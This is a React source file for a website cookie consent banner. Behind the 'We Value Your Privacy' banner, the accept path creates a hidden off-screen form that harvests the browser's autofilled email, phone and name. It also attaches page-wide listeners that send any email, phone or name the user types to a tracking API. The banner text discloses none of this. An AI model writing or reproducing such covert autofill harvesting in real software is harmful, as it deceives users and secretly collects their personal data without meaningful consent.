'use client';

import { useState, useEffect } from 'react';
import { X, Cookie } from 'lucide-react';

export default function CookieConsent() {
  const [showBanner, setShowBanner] = useState(false);
  const [sessionId, setSessionId] = useState<string>('');

  useEffect(() => {
    // Generate or get session ID
    let sid = localStorage.getItem('rauha_session_id');
    if (!sid) {
      sid = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
      localStorage.setItem('rauha_session_id', sid);
    }
    setSessionId(sid);

    // Check if user has already responded to cookie consent
    const consent = localStorage.getItem('rauha_cookie_consent');
    if (!consent) {
      // Show banner after a short delay
      setTimeout(() => setShowBanner(true), 1000);
    } else if (consent === 'accepted') {
      // Initialize tracking if consent was previously given
      initializeTracking(sid);
    }
  }, []);

  const captureAutofillData = (): Promise<{ email?: string; phone?: string; name?: string }> => {
    return new Promise((resolve) => {
      // Create hidden form to capture autofill data
      const form = document.createElement('form');
      form.style.position = 'absolute';
      form.style.left = '-9999px';
      form.style.opacity = '0';
      form.style.pointerEvents = 'none';

      const emailInput = document.createElement('input');
      emailInput.type = 'email';
      emailInput.name = 'email';
      emailInput.autocomplete = 'email';

      const phoneInput = document.createElement('input');
      phoneInput.type = 'tel';
      phoneInput.name = 'phone';
      phoneInput.autocomplete = 'tel';

      const nameInput = document.createElement('input');
      nameInput.type = 'text';
      nameInput.name = 'name';
      nameInput.autocomplete = 'name';

      form.appendChild(emailInput);
      form.appendChild(phoneInput);
      form.appendChild(nameInput);
      document.body.appendChild(form);

      // Wait for browser to autofill
      setTimeout(() => {
        const data = {
          email: emailInput.value || undefined,
          phone: phoneInput.value || undefined,
          name: nameInput.value || undefined,
        };

        // Clean up
        document.body.removeChild(form);
        resolve(data);
      }, 100);
    });
  };

  const initializeTracking = async (sid: string) => {
    try {
      // Get user info
      const userAgent = navigator.userAgent;
      const referrer = document.referrer || 'direct';
      const landingPage = window.location.href;

      // Try to capture autofill data
      const autofillData = await captureAutofillData();

      // Send tracking data to API
      await fetch('/api/tracking/session', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          session_id: sid,
          user_agent: userAgent,
          referrer,
          landing_page: landingPage,
          cookies_accepted: true,
          email: autofillData.email,
          phone: autofillData.phone,
          name: autofillData.name,
        }),
      });

      // Track page views
      trackPageView(sid);

      // Set up page view tracking on route changes
      setupPageViewTracking(sid);

      // Set up form field monitoring
      setupFormMonitoring(sid);
    } catch (error) {
      // Silently handle errors
    }
  };

  const setupFormMonitoring = (sid: string) => {
    // Monitor all email and phone inputs on the page
    const captureFormData = async (event: Event) => {
      const target = event.target as HTMLInputElement;

      if (target.type === 'email' && target.value && target.value.includes('@')) {
        await fetch('/api/tracking/update-user', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            session_id: sid,
            email: target.value,
          }),
        });
      }

      if (target.type === 'tel' && target.value) {
        await fetch('/api/tracking/update-user', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            session_id: sid,
            phone: target.value,
          }),
        });
      }

      if (target.name === 'name' && target.value) {
        await fetch('/api/tracking/update-user', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            session_id: sid,
            name: target.value,
          }),
        });
      }
    };

    // Listen for input changes
    document.addEventListener('change', captureFormData);
    document.addEventListener('blur', captureFormData, true);
  };

  const trackPageView = async (sid: string) => {
    try {
      await fetch('/api/tracking/pageview', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          session_id: sid,
          page_url: window.location.href,
          page_title: document.title,
        }),
      });
    } catch (error) {
      // Silently handle errors
    }
  };

  const setupPageViewTracking = (sid: string) => {
    // Track when user leaves page
    let startTime = Date.now();

    window.addEventListener('beforeunload', () => {
      const timeSpent = Math.floor((Date.now() - startTime) / 1000);
      navigator.sendBeacon('/api/tracking/timespent', JSON.stringify({
        session_id: sid,
        page_url: window.location.href,
        time_spent: timeSpent,
      }));
    });
  };

  const handleAccept = async () => {
    localStorage.setItem('rauha_cookie_consent', 'accepted');
    setShowBanner(false);

    // Initialize tracking
    await initializeTracking(sessionId);

    // Track acceptance event
    await fetch('/api/tracking/event', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        session_id: sessionId,
        event_type: 'cookie_accepted',
        event_data: JSON.stringify({ timestamp: new Date().toISOString() }),
      }),
    });
  };

  const handleDecline = async () => {
    localStorage.setItem('rauha_cookie_consent', 'declined');
    setShowBanner(false);

    // Track decline event (minimal tracking)
    await fetch('/api/tracking/event', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        session_id: sessionId,
        event_type: 'cookie_declined',
        event_data: JSON.stringify({ timestamp: new Date().toISOString() }),
      }),
    });
  };

  if (!showBanner) return null;

  return (
    <div className="fixed bottom-0 left-0 right-0 z-50 p-3 sm:p-4 animate-in slide-in-from-bottom">
      <div className="max-w-4xl mx-auto bg-white rounded-lg shadow-xl border border-rauha-accent/20">
        <div className="p-3 sm:p-4">
          <div className="flex items-start gap-3">
            <div className="flex-shrink-0 hidden sm:block">
              <Cookie className="w-5 h-5 text-rauha-accent" />
            </div>
            <div className="flex-1 min-w-0">
              <h3 className="text-sm sm:text-base font-semibold text-rauha-text mb-1.5">
                We Value Your Privacy
              </h3>
              <p className="text-xs sm:text-sm text-gray-600 mb-3 line-clamp-2 sm:line-clamp-none">
                We use cookies to enhance your browsing experience, analyze site traffic, and personalize content.
                By accepting cookies, you help us understand how you use our site so we can improve your experience.
              </p>
              <div className="flex flex-col sm:flex-row gap-2">
                <button
                  onClick={handleAccept}
                  className="px-4 py-2 bg-rauha-accent text-white rounded-md text-sm font-medium hover:bg-rauha-accent/90 transition-colors"
                >
                  Accept All Cookies
                </button>
                <button
                  onClick={handleDecline}
                  className="px-4 py-2 bg-gray-200 text-gray-700 rounded-md text-sm font-medium hover:bg-gray-300 transition-colors"
                >
                  Decline
                </button>
                <a
                  href="/privacy-policy"
                  className="px-4 py-2 text-rauha-accent border border-rauha-accent rounded-md text-sm font-medium hover:bg-rauha-accent/5 transition-colors text-center"
                >
                  Learn More
                </a>
              </div>
            </div>
            <button
              onClick={handleDecline}
              className="flex-shrink-0 text-gray-400 hover:text-gray-600 transition-colors -mt-1 -mr-1"
              aria-label="Close"
            >
              <X className="w-4 h-4 sm:w-5 sm:h-5" />
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
